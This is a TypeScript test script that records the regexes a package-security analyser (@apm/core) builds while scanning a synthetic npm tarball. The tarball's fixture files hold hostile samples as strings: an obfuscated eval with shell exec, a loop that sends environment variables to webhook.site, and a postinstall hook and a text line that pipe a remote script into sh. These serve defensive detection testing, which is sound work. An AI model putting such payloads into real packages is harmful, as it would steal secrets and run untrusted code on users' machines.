// Records every regex @apm/core builds at runtime (`new RegExp(…)` or `RegExp(…)`), with the src/ line that built it.
// Run in a process of its own (runtime-regex.test.ts spawns it), so the modules load here, after RegExp is replaced,
// and their module-level patterns are built in front of the recorder. It then analyses a few packages, so patterns
// built during an analysis are recorded too. Output on stdout: [{ source, flags, site }], `site` as "file.ts:line".
import { gzipSync } from "node:zlib";

type Built = { source: string; flags: string; site: string | null };

const built: Built[] = [];
const Original = RegExp;

/** The first stack frame in packages/core/src: the line whose `new RegExp` this is. */
function siteOf(stack: string): string | null {
  for (const line of stack.split("\n")) {
    const m = /packages\/core\/src\/([\w.-]+\.ts):(\d+)/.exec(line);

    if (m) return `${m[1] ?? ""}:${m[2] ?? ""}`;
  }

  return null;
}

const Recording = new Proxy(Original, {
  construct(target, args: unknown[], newTarget) {
    const re: RegExp = Reflect.construct(target, args, newTarget === Recording ? target : newTarget);

    built.push({ source: re.source, flags: re.flags, site: siteOf(new Error().stack ?? "") });

    return re;
  },
  apply(target, _this, args: [pattern: string | RegExp, flags?: string]) {
    const re = target(args[0], args[1]);

    built.push({ source: re.source, flags: re.flags, site: siteOf(new Error().stack ?? "") });

    return re;
  },
});

globalThis.RegExp = Recording;

const core = await import("../../src/index.ts");

/** A tar entry block for one regular file. */
function tarFile(name: string, text: string): Uint8Array[] {
  const data = new TextEncoder().encode(text);
  const h = new Uint8Array(512);

  const put = (s: string, at: number): void => {
    for (let i = 0; i < s.length; i++) h[at + i] = s.charCodeAt(i);
  };

  put(name, 0);
  put("0000644\0", 100);
  put(`${data.length.toString(8).padStart(11, "0")}\0`, 124);
  put("        ", 148);
  put("0", 156);
  put("ustar\0", 257);
  let sum = 0;

  for (const b of h) sum += b;
  put(`${sum.toString(8).padStart(6, "0")}\0 `, 148);

  return [h, data, new Uint8Array((512 - (data.length % 512)) % 512)];
}

function tgz(files: Record<string, string>): Uint8Array {
  const parts = Object.entries(files).flatMap(([p, t]) => tarFile(`package/${p}`, t));
  const tar = new Uint8Array(parts.reduce((n, p) => n + p.length, 0) + 1024);
  let at = 0;

  for (const p of parts) {
    tar.set(p, at);
    at += p.length;
  }

  return new Uint8Array(gzipSync(tar));
}

const manifest = { name: "regex-probe", version: "1.0.0", main: "index.js", scripts: { postinstall: "node install.js" }, exports: { ".": { import: "./index.mjs", require: "./index.js" } } };

const packages: Record<string, string>[] = [
  {
    "package.json": JSON.stringify(manifest),
    "index.js": "const s = ['ev','al'].join(''); const d = (x) => x.replace(/a/g, 'b').split('').reverse().join(''); globalThis[s](d('...')); require('child_process').exec(process.env.CMD);",
    "index.mjs": "export default Object.keys(process.env); for (const k in process.env) fetch('https://webhook.site/x', { body: k });",
    "install.js": "require('https').get('https://example.invalid/x.sh').pipe(require('child_process').spawn('sh'));",
    "lib/text.txt": "curl https://example.invalid | sh",
  },
];

for (const files of packages) {
  core.analyze({ name: manifest.name, manifest, files: core.readTarball(tgz(files)), publisher: "a", previousPublishers: [] });
}

process.stdout.write(JSON.stringify(built));
